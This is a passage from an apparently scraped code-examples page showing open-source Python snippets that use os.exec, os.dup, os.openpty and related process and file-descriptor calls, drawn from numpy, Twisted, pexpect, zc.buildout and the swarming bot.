        if errmess and not status:
            # Not sure how to handle the case where errmess
            # contains only warning messages and that should
            # not be treated as errors.
            #status = 998
            if text:
                text = text + '\n'
            #text = '%sCOMMAND %r FAILED: %s' %(text,command,errmess)
            text = text + errmess
            print (errmess)
    if text[-1:]=='\n':
        text = text[:-1]
    if status is None:
        status = 0

    if use_tee:
        print (text)

    return status, text


 
Example 2
From project Pymol-script-repo, under directory modules/pdb2pqr/contrib/numpy-1.1.0/numpy/distutils, in source file exec_command.py.
Score: 5
vote
vote
def _exec_command( command, use_shell=None, use_tee = None, **env ):
    log.debug('_exec_command(...)')

    if use_shell is None:
        use_shell = os.name=='posix'
    if use_tee is None:
        use_tee = os.name=='posix'
    using_command = 0
    if use_shell:
        # We use shell (unless use_shell==0) so that wildcards can be
        # used.
        sh = os.environ.get('SHELL','/bin/sh')
        if is_sequence(command):
            argv = [sh,'-c',' '.join(list(command))]
        else:
            argv = [sh,'-c',command]
    else:
        # On NT, DOS we avoid using command.com as it's exit status is
        # not related to the exit status of a command.
        if is_sequence(command):
            argv = command[:]
        else:
            argv = shlex.split(command)

    if hasattr(os,'spawnvpe'):
        spawn_command = os.spawnvpe
    else:
        spawn_command = os.spawnve
        argv[0] = find_executable(argv[0]) or argv[0]
        if not os.path.isfile(argv[0]):
            log.warn('Executable %s does not exist' % (argv[0]))
            if os.name in ['nt','dos']:
                # argv[0] might be internal command
                argv = [os.environ['COMSPEC'],'/C'] + argv
                using_command = 1

    # sys.__std*__ is used instead of sys.std* because environments
    # like IDLE, PyCrust, etc overwrite sys.std* commands.
    so_fileno = sys.__stdout__.fileno()
    se_fileno = sys.__stderr__.fileno()
    so_flush = sys.__stdout__.flush
    se_flush = sys.__stderr__.flush
    so_dup = os.dup(so_fileno)
    se_dup = os.dup(se_fileno)

    outfile = temp_file_name()
    fout = open(outfile,'w')
    if using_command:
        errfile = temp_file_name()
        ferr = open(errfile,'w')

    log.debug('Running %s(%s,%r,%r,os.environ)' \
              % (spawn_command.__name__,os.P_WAIT,argv[0],argv))

    argv0 = argv[0]
    if not using_command:
        argv[0] = quote_arg(argv0)

    so_flush()
    se_flush()
    os.dup2(fout.fileno(),so_fileno)
    if using_command:
        #XXX: disabled for now as it does not work from cmd under win32.
        #     Tests fail on msys
        os.dup2(ferr.fileno(),se_fileno)
    else:
        os.dup2(fout.fileno(),se_fileno)
    try:
        status = spawn_command(os.P_WAIT,argv0,argv,os.environ)
    except OSError,errmess:
        status = 999
        sys.stderr.write('%s: %s'%(errmess,argv[0]))

    so_flush()
    se_flush()
    os.dup2(so_dup,so_fileno)
    os.dup2(se_dup,se_fileno)

    fout.close()
    fout = open(outfile,'r')
    text = fout.read()
    fout.close()
    os.remove(outfile)

    if using_command:
        ferr.close()
        ferr = open(errfile,'r')
        errmess = ferr.read()
        ferr.close()
        os.remove(errfile)
        if errmess and not status:
            # Not sure how to handle the case where errmess
            # contains only warning messages and that should
            # not be treated as errors.
            #status = 998
            if text:
                text = text + '\n'
            #text = '%sCOMMAND %r FAILED: %s' %(text,command,errmess)
            text = text + errmess
            print errmess
    if text[-1:]=='\n':
        text = text[:-1]
    if status is None:
        status = 0

    if use_tee:
        print text

    return status, text


 
Example 3
From project numpy, under directory numpy/distutils, in source file exec_command.py.
Score: 5
vote
vote
def _exec_command( command, use_shell=None, use_tee = None, **env ):
    log.debug('_exec_command(...)')

    if use_shell is None:
        use_shell = os.name=='posix'
    if use_tee is None:
        use_tee = os.name=='posix'
    using_command = 0
    if use_shell:
        # We use shell (unless use_shell==0) so that wildcards can be
        # used.
        sh = os.environ.get('SHELL', '/bin/sh')
        if is_sequence(command):
            argv = [sh, '-c', ' '.join(list(command))]
        else:
            argv = [sh, '-c', command]
    else:
        # On NT, DOS we avoid using command.com as it's exit status is
        # not related to the exit status of a command.
        if is_sequence(command):
            argv = command[:]
        else:
            argv = shlex.split(command)

    if hasattr(os, 'spawnvpe'):
        spawn_command = os.spawnvpe
    else:
        spawn_command = os.spawnve
        argv[0] = find_executable(argv[0]) or argv[0]
        if not os.path.isfile(argv[0]):
            log.warn('Executable %s does not exist' % (argv[0]))
            if os.name in ['nt', 'dos']:
                # argv[0] might be internal command
                argv = [os.environ['COMSPEC'], '/C'] + argv
                using_command = 1

    _so_has_fileno = _supports_fileno(sys.stdout)
    _se_has_fileno = _supports_fileno(sys.stderr)
    so_flush = sys.stdout.flush
    se_flush = sys.stderr.flush
    if _so_has_fileno:
        so_fileno = sys.stdout.fileno()
        so_dup = os.dup(so_fileno)
    if _se_has_fileno:
        se_fileno = sys.stderr.fileno()
        se_dup = os.dup(se_fileno)

    outfile = temp_file_name()
    fout = open(outfile, 'w')
    if using_command:
        errfile = temp_file_name()
        ferr = open(errfile, 'w')

    log.debug('Running %s(%s,%r,%r,os.environ)' \
              % (spawn_command.__name__, os.P_WAIT, argv[0], argv))

    argv0 = argv[0]
    if not using_command:
        argv[0] = quote_arg(argv0)

    so_flush()
    se_flush()
    if _so_has_fileno:
        os.dup2(fout.fileno(), so_fileno)

    if _se_has_fileno:
        if using_command:
            #XXX: disabled for now as it does not work from cmd under win32.
            #     Tests fail on msys
            os.dup2(ferr.fileno(), se_fileno)
        else:
            os.dup2(fout.fileno(), se_fileno)
    try:
        status = spawn_command(os.P_WAIT, argv0, argv, os.environ)
    except OSError:
        errmess = str(get_exception())
        status = 999
        sys.stderr.write('%s: %s'%(errmess, argv[0]))

    so_flush()
    se_flush()
    if _so_has_fileno:
        os.dup2(so_dup, so_fileno)
    if _se_has_fileno:
        os.dup2(se_dup, se_fileno)

    fout.close()
    fout = open_latin1(outfile, 'r')
    text = fout.read()
    fout.close()
    os.remove(outfile)

    if using_command:
        ferr.close()
        ferr = open_latin1(errfile, 'r')
        errmess = ferr.read()
        ferr.close()
        os.remove(errfile)
        if errmess and not status:
            # Not sure how to handle the case where errmess
            # contains only warning messages and that should
            # not be treated as errors.
            #status = 998
            if text:
                text = text + '\n'
            #text = '%sCOMMAND %r FAILED: %s' %(text,command,errmess)
            text = text + errmess
            print (errmess)
    if text[-1:]=='\n':
        text = text[:-1]
    if status is None:
        status = 0

    if use_tee:
        print (text)

    return status, text
}
#Python os.exec Examples
{
Python os.exec Examples

The following are 2 code examples for showing how to use os.exec. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project panya-redhat-offline, under directory eggs/zc.buildout-1.5.1-py2.6.egg/zc/buildout, in source file easy_install.py.
Score: 8
vote
vote
def _generate_interpreter(name, dest, executable, site_py_dest,
                          relative_paths=False):
    """Write an interpreter script, using the site.py approach."""
    full_name = os.path.join(dest, name)
    site_py_dest_string, rpsetup = _relative_path_and_setup(
        full_name, [site_py_dest], relative_paths, omit_os_import=True)
    if rpsetup:
        rpsetup += "\n"
    if sys.platform == 'win32':
        windows_import = '\nimport subprocess'
        # os.exec* is a mess on Windows, particularly if the path
        # to the executable has spaces and the Python is using MSVCRT.
        # The standard fix is to surround the executable's path with quotes,
        # but that has been unreliable in testing.
        #
        # Here's a demonstration of the problem.  Given a Python
        # compiled with a MSVCRT-based compiler, such as the free Visual
        # C++ 2008 Express Edition, and an executable path with spaces
        # in it such as the below, we see the following.
        #
        # >>> import os
        # >>> p0 = 'C:\\Documents and Settings\\Administrator\\My Documents\\Downloads\\Python-2.6.4\\PCbuild\\python.exe'
        # >>> os.path.exists(p0)
        # True
        # >>> os.execv(p0, [])
        # Traceback (most recent call last):
        #  File "<stdin>", line 1, in <module>
        # OSError: [Errno 22] Invalid argument
        #
        # That seems like a standard problem.  The standard solution is
        # to quote the path (see, for instance
        # http://bugs.python.org/issue436259).  However, this solution,
        # and other variations, fail:
        #
        # >>> p1 = '"C:\\Documents and Settings\\Administrator\\My Documents\\Downloads\\Python-2.6.4\\PCbuild\\python.exe"'
        # >>> os.execv(p1, [])
        # Traceback (most recent call last):
        #   File "<stdin>", line 1, in <module>
        # OSError: [Errno 22] Invalid argument
        #
        # We simply use subprocess instead, since it handles everything
        # nicely, and the transparency of exec* (that is, not running,
        # perhaps unexpectedly, in a subprocess) is arguably not a
        # necessity, at least for many use cases.
        execute = 'subprocess.call(argv, env=environ)'
    else:
        windows_import = ''
        execute = 'os.execve(sys.executable, argv, environ)'
    contents = interpreter_template % dict(
        python=_safe_arg(executable),
        dash_S=' -S',
        site_dest=site_py_dest_string,
        relative_paths_setup=rpsetup,
        windows_import=windows_import,
        execute=execute,
        )
    return _write_script(full_name, contents, 'interpreter')

 
Example 2
From project luci-py-master, under directory appengine/swarming/swarming_bot, in source file bot_main.py.
Score: 8
vote
vote
def update_bot(botobj, version):
  """Downloads the new version of the bot code and then runs it.

  Use alternating files; first load swarming_bot.1.zip, then swarming_bot.2.zip,
  never touching swarming_bot.zip which was the originally bootstrapped file.

  Does not return.

  TODO(maruel): Create LKGBC:
  https://code.google.com/p/swarming/issues/detail?id=112
  """
  # Alternate between .1.zip and .2.zip.
  new_zip = 'swarming_bot.1.zip'
  if os.path.basename(THIS_FILE) == new_zip:
    new_zip = 'swarming_bot.2.zip'

  # Download as a new file.
  url = botobj.remote.url + '/swarming/api/v1/bot/bot_code/%s' % version
  if not net.url_retrieve(new_zip, url):
    # Try without a specific version. It can happen when a server is rapidly
    # updated multiple times in a row.
    botobj.post_error(
        'Unable to download %s from %s; first tried version %s' %
        (new_zip, url, version))
    # Poll again, this may work next time. To prevent busy-loop, sleep a little.
    time.sleep(2)
    return

  logging.info('Restarting to %s.', new_zip)
  sys.stdout.flush()
  sys.stderr.flush()

  # Do not call on_bot_shutdown.
  # On OSX, launchd will be unhappy if we quit so the old code bot process has
  # to outlive the new code child process. Launchd really wants the main process
  # to survive, and it'll restart it if it disappears. os.exec*() replaces the
  # process so this is fine.
  ret = common.exec_python([new_zip, 'start_slave', '--survive'])
  if ret:
    botobj.post_error('Bot failed to respawn after update: %s' % ret)
  sys.exit(ret)


 
}
#Python os.dup Examples
{
 Python os.dup Examples

The following are 7 code examples for showing how to use os.dup. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project pytest-master, under directory testing, in source file test_capture.py.
Score: 10
vote
vote
def test_fdfuncarg_skips_on_no_osdup(testdir):
    testdir.makepyfile("""
        import os
        if hasattr(os, 'dup'):
            del os.dup
        def test_hello(capfd):
            pass
    """)
    result = testdir.runpytest_subprocess("--capture=no")
    result.stdout.fnmatch_lines([
        "*1 skipped*"
    ])


 
Example 2
From project pyoac, under directory pypy/rpython/module, in source file ll_os.py.
Score: 10
vote
vote
def register_os_dup(self):
        os_dup = self.llexternal(underscore_on_windows+'dup', [rffi.INT], rffi.INT)

        def dup_llimpl(fd):
            newfd = rffi.cast(lltype.Signed, os_dup(rffi.cast(rffi.INT, fd)))
            if newfd == -1:
                raise OSError(rposix.get_errno(), "dup failed")
            return newfd
        
        return extdef([int], int, llimpl=dup_llimpl,
                      export_name="ll_os.ll_os_dup", oofakeimpl=os.dup)

     
Example 3
From project hue, under directory desktop/core/ext-py/Twisted/twisted/internet, in source file process.py.
Score: 5
vote
vote
def _setupChild(self, fdmap):
        """
        fdmap[childFD] = parentFD

        The child wants to end up with 'childFD' attached to what used to be
        the parent's parentFD. As an example, a bash command run like
        'command 2>&1' would correspond to an fdmap of {0:0, 1:1, 2:1}.
        'command >foo.txt' would be {0:0, 1:os.open('foo.txt'), 2:2}.

        This is accomplished in two steps::

            1. close all file descriptors that aren't values of fdmap.  This
               means 0 .. maxfds.

            2. for each childFD::

                 - if fdmap[childFD] == childFD, the descriptor is already in
                   place.  Make sure the CLOEXEC flag is not set, then delete
                   the entry from fdmap.

                 - if childFD is in fdmap.values(), then the target descriptor
                   is busy. Use os.dup() to move it elsewhere, update all
                   fdmap[childFD] items that point to it, then close the
                   original. Then fall through to the next case.

                 - now fdmap[childFD] is not in fdmap.values(), and is free.
                   Use os.dup2() to move it to the right place, then close the
                   original.
        """

        debug = self.debug_child
        if debug:
            errfd = sys.stderr
            errfd.write("starting _setupChild\n")

        destList = fdmap.values()
        try:
            import resource
            maxfds = resource.getrlimit(resource.RLIMIT_NOFILE)[1] + 1
            # OS-X reports 9223372036854775808. That's a lot of fds to close
            if maxfds > 1024:
                maxfds = 1024
        except:
            maxfds = 256

        for fd in xrange(maxfds):
            if fd in destList:
                continue
            if debug and fd == errfd.fileno():
                continue
            try:
                os.close(fd)
            except:
                pass

        # at this point, the only fds still open are the ones that need to
        # be moved to their appropriate positions in the child (the targets
        # of fdmap, i.e. fdmap.values() )

        if debug: print >>errfd, "fdmap", fdmap
        childlist = fdmap.keys()
        childlist.sort()

        for child in childlist:
            target = fdmap[child]
            if target == child:
                # fd is already in place
                if debug: print >>errfd, "%d already in place" % target
                if fcntl and hasattr(fcntl, 'FD_CLOEXEC'):
                    old = fcntl.fcntl(child, fcntl.F_GETFD)
                    fcntl.fcntl(child,
                                fcntl.F_SETFD, old & ~fcntl.FD_CLOEXEC)
            else:
                if child in fdmap.values():
                    # we can't replace child-fd yet, as some other mapping
                    # still needs the fd it wants to target. We must preserve
                    # that old fd by duping it to a new home.
                    newtarget = os.dup(child) # give it a safe home
                    if debug: print >>errfd, "os.dup(%d) -> %d" % (child,
                                                                   newtarget)
                    os.close(child) # close the original
                    for c, p in fdmap.items():
                        if p == child:
                            fdmap[c] = newtarget # update all pointers
                # now it should be available
                if debug: print >>errfd, "os.dup2(%d,%d)" % (target, child)
                os.dup2(target, child)

        # At this point, the child has everything it needs. We want to close
        # everything that isn't going to be used by the child, i.e.
        # everything not in fdmap.keys(). The only remaining fds open are
        # those in fdmap.values().

        # Any given fd may appear in fdmap.values() multiple times, so we
        # need to remove duplicates first.

        old = []
        for fd in fdmap.values():
            if not fd in old:
                if not fd in fdmap.keys():
                    old.append(fd)
        if debug: print >>errfd, "old", old
        for fd in old:
            os.close(fd)

     

 
Example 4
From project vodafone-mobile-connect, under directory attic/VodafoneMobileConnectCard/output/src/opt/vmc/lib/python2.5/site-packages/twisted/internet, in source file process.py.
Score: 5
vote
vote
def _setupChild(self, fdmap):
        """
        fdmap[childFD] = parentFD

        The child wants to end up with 'childFD' attached to what used to be
        the parent's parentFD. As an example, a bash command run like
        'command 2>&1' would correspond to an fdmap of {0:0, 1:1, 2:1}.
        'command >foo.txt' would be {0:0, 1:os.open('foo.txt'), 2:2}.

        This is accomplished in two steps::

            1. close all file descriptors that aren't values of fdmap.  This means
               0 .. maxfds.

            2. for each childFD::

                 - if fdmap[childFD] == childFD, the descriptor is already in
                   place.  Make sure the CLOEXEC flag is not set, then delete the
                   entry from fdmap.

                 - if childFD is in fdmap.values(), then the target descriptor is
                   busy. Use os.dup() to move it elsewhere, update all
                   fdmap[childFD] items that point to it, then close the
                   original. Then fall through to the next case.

                 - now fdmap[childFD] is not in fdmap.values(), and is free. Use
                   os.dup2() to move it to the right place, then close the
                   original.
        """

        debug = self.debug_child
        if debug:
            #errfd = open("/tmp/p.err", "a", 0)
            errfd = sys.stderr
            print >>errfd, "starting _setupChild"

        destList = fdmap.values()
        try:
            import resource
            maxfds = resource.getrlimit(resource.RLIMIT_NOFILE)[1] + 1
            # OS-X reports 9223372036854775808. That's a lot of fds to close
            if maxfds > 1024:
                maxfds = 1024
        except:
            maxfds = 256

        for fd in range(maxfds):
            if fd in destList:
                continue
            if debug and fd == errfd.fileno():
                continue
            try:    os.close(fd)
            except: pass

        # at this point, the only fds still open are the ones that need to
        # be moved to their appropriate positions in the child (the targets
        # of fdmap, i.e. fdmap.values() )

        if debug: print >>errfd, "fdmap", fdmap
        childlist = fdmap.keys()
        childlist.sort()

        for child in childlist:
            target = fdmap[child]
            if target == child:
                # fd is already in place
                if debug: print >>errfd, "%d already in place" % target
                if fcntl and hasattr(fcntl, 'FD_CLOEXEC'):
                    old = fcntl.fcntl(child, fcntl.F_GETFD)
                    fcntl.fcntl(child,
                                fcntl.F_SETFD, old & ~fcntl.FD_CLOEXEC)
            else:
                if child in fdmap.values():
                    # we can't replace child-fd yet, as some other mapping
                    # still needs the fd it wants to target. We must preserve
                    # that old fd by duping it to a new home.
                    newtarget = os.dup(child) # give it a safe home
                    if debug: print >>errfd, "os.dup(%d) -> %d" % (child,
                                                                   newtarget)
                    os.close(child) # close the original
                    for c,p in fdmap.items():
                        if p == child:
                            fdmap[c] = newtarget # update all pointers
                # now it should be available
                if debug: print >>errfd, "os.dup2(%d,%d)" % (target, child)
                os.dup2(target, child)

        # At this point, the child has everything it needs. We want to close
        # everything that isn't going to be used by the child, i.e.
        # everything not in fdmap.keys(). The only remaining fds open are
        # those in fdmap.values().

        # Any given fd may appear in fdmap.values() multiple times, so we
        # need to remove duplicates first.

        old = []
        for fd in fdmap.values():
            if not fd in old:
                if not fd in fdmap.keys():
                    old.append(fd)
        if debug: print >>errfd, "old", old
        for fd in old:
            os.close(fd)

     
Example 5
From project VTK, under directory ThirdParty/Twisted/twisted/internet, in source file process.py.
Score: 5
vote
vote
def _setupChild(self, fdmap):
        """
        fdmap[childFD] = parentFD

        The child wants to end up with 'childFD' attached to what used to be
        the parent's parentFD. As an example, a bash command run like
        'command 2>&1' would correspond to an fdmap of {0:0, 1:1, 2:1}.
        'command >foo.txt' would be {0:0, 1:os.open('foo.txt'), 2:2}.

        This is accomplished in two steps::

            1. close all file descriptors that aren't values of fdmap.  This
               means 0 .. maxfds (or just the open fds within that range, if
               the platform supports '/proc/<pid>/fd').

            2. for each childFD::

                 - if fdmap[childFD] == childFD, the descriptor is already in
                   place.  Make sure the CLOEXEC flag is not set, then delete
                   the entry from fdmap.

                 - if childFD is in fdmap.values(), then the target descriptor
                   is busy. Use os.dup() to move it elsewhere, update all
                   fdmap[childFD] items that point to it, then close the
                   original. Then fall through to the next case.

                 - now fdmap[childFD] is not in fdmap.values(), and is free.
                   Use os.dup2() to move it to the right place, then close the
                   original.
        """

        debug = self.debug_child
        if debug:
            errfd = sys.stderr
            errfd.write("starting _setupChild\n")

        destList = fdmap.values()
        for fd in _listOpenFDs():
            if fd in destList:
                continue
            if debug and fd == errfd.fileno():
                continue
            try:
                os.close(fd)
            except:
                pass

        # at this point, the only fds still open are the ones that need to
        # be moved to their appropriate positions in the child (the targets
        # of fdmap, i.e. fdmap.values() )

        if debug: print >>errfd, "fdmap", fdmap
        childlist = fdmap.keys()
        childlist.sort()

        for child in childlist:
            target = fdmap[child]
            if target == child:
                # fd is already in place
                if debug: print >>errfd, "%d already in place" % target
                fdesc._unsetCloseOnExec(child)
            else:
                if child in fdmap.values():
                    # we can't replace child-fd yet, as some other mapping
                    # still needs the fd it wants to target. We must preserve
                    # that old fd by duping it to a new home.
                    newtarget = os.dup(child) # give it a safe home
                    if debug: print >>errfd, "os.dup(%d) -> %d" % (child,
                                                                   newtarget)
                    os.close(child) # close the original
                    for c, p in fdmap.items():
                        if p == child:
                            fdmap[c] = newtarget # update all pointers
                # now it should be available
                if debug: print >>errfd, "os.dup2(%d,%d)" % (target, child)
                os.dup2(target, child)

        # At this point, the child has everything it needs. We want to close
        # everything that isn't going to be used by the child, i.e.
        # everything not in fdmap.keys(). The only remaining fds open are
        # those in fdmap.values().

        # Any given fd may appear in fdmap.values() multiple times, so we
        # need to remove duplicates first.

        old = []
        for fd in fdmap.values():
            if not fd in old:
                if not fd in fdmap.keys():
                    old.append(fd)
        if debug: print >>errfd, "old", old
        for fd in old:
            os.close(fd)

        self._resetSignalDisposition()


     
Example 6
From project twisted, under directory twisted/internet, in source file process.py.
Score: 5
vote
vote
def _setupChild(self, fdmap):
        """
        fdmap[childFD] = parentFD

        The child wants to end up with 'childFD' attached to what used to be
        the parent's parentFD. As an example, a bash command run like
        'command 2>&1' would correspond to an fdmap of {0:0, 1:1, 2:1}.
        'command >foo.txt' would be {0:0, 1:os.open('foo.txt'), 2:2}.

        This is accomplished in two steps::

            1. close all file descriptors that aren't values of fdmap.  This
               means 0 .. maxfds.

            2. for each childFD::

                 - if fdmap[childFD] == childFD, the descriptor is already in
                   place.  Make sure the CLOEXEC flag is not set, then delete
                   the entry from fdmap.

                 - if childFD is in fdmap.values(), then the target descriptor
                   is busy. Use os.dup() to move it elsewhere, update all
                   fdmap[childFD] items that point to it, then close the
                   original. Then fall through to the next case.

                 - now fdmap[childFD] is not in fdmap.values(), and is free.
                   Use os.dup2() to move it to the right place, then close the
                   original.
        """

        debug = self.debug_child
        if debug:
            errfd = sys.stderr
            errfd.write("starting _setupChild\n")

        destList = fdmap.values()
        try:
            import resource
            maxfds = resource.getrlimit(resource.RLIMIT_NOFILE)[1] + 1
            # OS-X reports 9223372036854775808. That's a lot of fds to close
            if maxfds > 1024:
                maxfds = 1024
        except:
            maxfds = 256

        for fd in xrange(maxfds):
            if fd in destList:
                continue
            if debug and fd == errfd.fileno():
                continue
            try:
                os.close(fd)
            except:
                pass

        # at this point, the only fds still open are the ones that need to
        # be moved to their appropriate positions in the child (the targets
        # of fdmap, i.e. fdmap.values() )

        if debug: print >>errfd, "fdmap", fdmap
        childlist = fdmap.keys()
        childlist.sort()

        for child in childlist:
            target = fdmap[child]
            if target == child:
                # fd is already in place
                if debug: print >>errfd, "%d already in place" % target
                fdesc._unsetCloseOnExec(child)
            else:
                if child in fdmap.values():
                    # we can't replace child-fd yet, as some other mapping
                    # still needs the fd it wants to target. We must preserve
                    # that old fd by duping it to a new home.
                    newtarget = os.dup(child) # give it a safe home
                    if debug: print >>errfd, "os.dup(%d) -> %d" % (child,
                                                                   newtarget)
                    os.close(child) # close the original
                    for c, p in fdmap.items():
                        if p == child:
                            fdmap[c] = newtarget # update all pointers
                # now it should be available
                if debug: print >>errfd, "os.dup2(%d,%d)" % (target, child)
                os.dup2(target, child)

        # At this point, the child has everything it needs. We want to close
        # everything that isn't going to be used by the child, i.e.
        # everything not in fdmap.keys(). The only remaining fds open are
        # those in fdmap.values().

        # Any given fd may appear in fdmap.values() multiple times, so we
        # need to remove duplicates first.

        old = []
        for fd in fdmap.values():
            if not fd in old:
                if not fd in fdmap.keys():
                    old.append(fd)
        if debug: print >>errfd, "old", old
        for fd in old:
            os.close(fd)

     
Example 7
From project cc, under directory vendor/Twisted-10.0.0/twisted/internet, in source file process.py.
Score: 5
vote
vote
def _setupChild(self, fdmap):
        """
        fdmap[childFD] = parentFD

        The child wants to end up with 'childFD' attached to what used to be
        the parent's parentFD. As an example, a bash command run like
        'command 2>&1' would correspond to an fdmap of {0:0, 1:1, 2:1}.
        'command >foo.txt' would be {0:0, 1:os.open('foo.txt'), 2:2}.

        This is accomplished in two steps::

            1. close all file descriptors that aren't values of fdmap.  This
               means 0 .. maxfds.

            2. for each childFD::

                 - if fdmap[childFD] == childFD, the descriptor is already in
                   place.  Make sure the CLOEXEC flag is not set, then delete
                   the entry from fdmap.

                 - if childFD is in fdmap.values(), then the target descriptor
                   is busy. Use os.dup() to move it elsewhere, update all
                   fdmap[childFD] items that point to it, then close the
                   original. Then fall through to the next case.

                 - now fdmap[childFD] is not in fdmap.values(), and is free.
                   Use os.dup2() to move it to the right place, then close the
                   original.
        """

        debug = self.debug_child
        if debug:
            errfd = sys.stderr
            errfd.write("starting _setupChild\n")

        destList = fdmap.values()
        try:
            import resource
            maxfds = resource.getrlimit(resource.RLIMIT_NOFILE)[1] + 1
            # OS-X reports 9223372036854775808. That's a lot of fds to close
            if maxfds > 1024:
                maxfds = 1024
        except:
            maxfds = 256

        for fd in xrange(maxfds):
            if fd in destList:
                continue
            if debug and fd == errfd.fileno():
                continue
            try:
                os.close(fd)
            except:
                pass

        # at this point, the only fds still open are the ones that need to
        # be moved to their appropriate positions in the child (the targets
        # of fdmap, i.e. fdmap.values() )

        if debug: print >>errfd, "fdmap", fdmap
        childlist = fdmap.keys()
        childlist.sort()

        for child in childlist:
            target = fdmap[child]
            if target == child:
                # fd is already in place
                if debug: print >>errfd, "%d already in place" % target
                fdesc._unsetCloseOnExec(child)
            else:
                if child in fdmap.values():
                    # we can't replace child-fd yet, as some other mapping
                    # still needs the fd it wants to target. We must preserve
                    # that old fd by duping it to a new home.
                    newtarget = os.dup(child) # give it a safe home
                    if debug: print >>errfd, "os.dup(%d) -> %d" % (child,
                                                                   newtarget)
                    os.close(child) # close the original
                    for c, p in fdmap.items():
                        if p == child:
                            fdmap[c] = newtarget # update all pointers
                # now it should be available
                if debug: print >>errfd, "os.dup2(%d,%d)" % (target, child)
                os.dup2(target, child)

        # At this point, the child has everything it needs. We want to close
        # everything that isn't going to be used by the child, i.e.
        # everything not in fdmap.keys(). The only remaining fds open are
        # those in fdmap.values().

        # Any given fd may appear in fdmap.values() multiple times, so we
        # need to remove duplicates first.

        old = []
        for fd in fdmap.values():
            if not fd in old:
                if not fd in fdmap.keys():
                    old.append(fd)
        if debug: print >>errfd, "old", old
        for fd in old:
            os.close(fd)

        self._resetSignalDisposition()


     
}
#Python os.openpty Examples
{
Python os.openpty Examples

The following are 13 code examples for showing how to use os.openpty. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project play1, under directory python/Lib, in source file pty.py.
Score: 10
vote
vote
def openpty():
    """openpty() -> (master_fd, slave_fd)
    Open a pty master/slave pair, using os.openpty() if possible."""

    try:
        return os.openpty()
    except (AttributeError, OSError):
        pass
    master_fd, slave_name = _open_terminal()
    slave_fd = slave_open(slave_name)
    return master_fd, slave_fd

 
Example 2
From project coconut-shell, under directory , in source file terminal.py.
Score: 10
vote
vote
def openpty():
    master_fd, slave_fd = os.openpty()
    return os.fdopen(master_fd, "w"), os.fdopen(slave_fd, "w")


 
Example 3
From project mozbuilds, under directory mozilla-build/python/Lib/test, in source file test_openpty.py.
Score: 10
vote
vote
def test(self):
        master, slave = os.openpty()
        if not os.isatty(slave):
            self.fail("Slave-end of pty is not a terminal.")

        os.write(slave, 'Ping!')
        self.assertEqual(os.read(master, 1024), 'Ping!')

 

 
Example 4
From project intensityengine, under directory tests, in source file pexpect.py.
Score: 10
vote
vote
def __fork_pty(self):
        """This implements a substitute for the forkpty system call.
        This should be more portable than the pty.fork() function.
        Specifically, this should work on Solaris.
        
        Modified 10.06.05 by Geoff Marshall:
            Implemented __fork_pty() method to resolve the issue with Python's 
            pty.fork() not supporting Solaris, particularly ssh.
        Based on patch to posixmodule.c authored by Noah Spurrier:
            http://mail.python.org/pipermail/python-dev/2003-May/035281.html
        """
        parent_fd, child_fd = os.openpty()
        if parent_fd < 0 or child_fd < 0:
            raise ExceptionPexpect, "Error! Could not open pty with os.openpty()."
        
        pid = os.fork()
        if pid < 0:
            raise ExceptionPexpect, "Error! Failed os.fork()."
        elif pid == 0:
            # Child.
            os.close(parent_fd)
            self.__pty_make_controlling_tty(child_fd)
            
            os.dup2(child_fd, 0)
            os.dup2(child_fd, 1)
            os.dup2(child_fd, 2)
            
            if child_fd > 2:
                os.close(child_fd)
        else:
            # Parent.
            os.close(child_fd)
        
        return pid, parent_fd
                
     
Example 5
From project pyoac, under directory lib-python/2.5.2, in source file pty.py.
Score: 10
vote
vote
def openpty():
    """openpty() -> (master_fd, slave_fd)
    Open a pty master/slave pair, using os.openpty() if possible."""

    try:
        return os.openpty()
    except (AttributeError, OSError):
        pass
    master_fd, slave_name = _open_terminal()
    slave_fd = slave_open(slave_name)
    return master_fd, slave_fd

 
Example 6
From project ipyurwid, under directory IPython/external, in source file pexpect.py.
Score: 10
vote
vote
def __fork_pty(self):

        """This implements a substitute for the forkpty system call. This
        should be more portable than the pty.fork() function. Specifically,
        this should work on Solaris.

        Modified 10.06.05 by Geoff Marshall: Implemented __fork_pty() method to
        resolve the issue with Python's pty.fork() not supporting Solaris,
        particularly ssh. Based on patch to posixmodule.c authored by Noah
        Spurrier::

            http://mail.python.org/pipermail/python-dev/2003-May/035281.html

        """

        parent_fd, child_fd = os.openpty()
        if parent_fd < 0 or child_fd < 0:
            raise ExceptionPexpect, "Error! Could not open pty with os.openpty()."

        pid = os.fork()
        if pid < 0:
            raise ExceptionPexpect, "Error! Failed os.fork()."
        elif pid == 0:
            # Child.
            os.close(parent_fd)
            self.__pty_make_controlling_tty(child_fd)

            os.dup2(child_fd, 0)
            os.dup2(child_fd, 1)
            os.dup2(child_fd, 2)

            if child_fd > 2:
                os.close(child_fd)
        else:
            # Parent.
            os.close(child_fd)

        return pid, parent_fd

     
Example 7
From project ibus, under directory test, in source file test_client.py.
Score: 10
vote
vote
def __init__(self):
        self.__init_curses()
        self.__bus = ibus.Bus()
        self.__ic_path = self.__bus.create_input_context("DemoTerm")
        self.__ic = ibus.InputContext(self.__bus, self.__ic_path, True)
        self.__ic.set_capabilities(7)
        self.__ic.connect("commit-text", self.__commit_text_cb)

        self.__ic.connect("update-preedit-text", self.__update_preedit_text_cb)
        self.__ic.connect("show-preedit-text", self.__show_preedit_text_cb)
        self.__ic.connect("hide-preedit-text", self.__hide_preedit_text_cb)

        self.__ic.connect("update-auxiliary-text", self.__update_aux_text_cb)
        self.__ic.connect("show-auxiliary-text", self.__show_aux_text_cb)
        self.__ic.connect("hide-auxiliary-text", self.__hide_aux_text_cb)

        self.__ic.connect("update-lookup-table", self.__update_lookup_table_cb)
        self.__ic.connect("show-lookup-table", self.__show_lookup_table_cb)
        self.__ic.connect("hide-lookup-table", self.__hide_lookup_table_cb)
        glib.io_add_watch(0, glib.IO_IN, self.__stdin_cb)
        # glib.timeout_add(500, self.__timeout_cb)

        # self.__master_fd, self.__slave_fd = os.openpty()
        # self.__run_shell()

        self.__is_invalidate = False
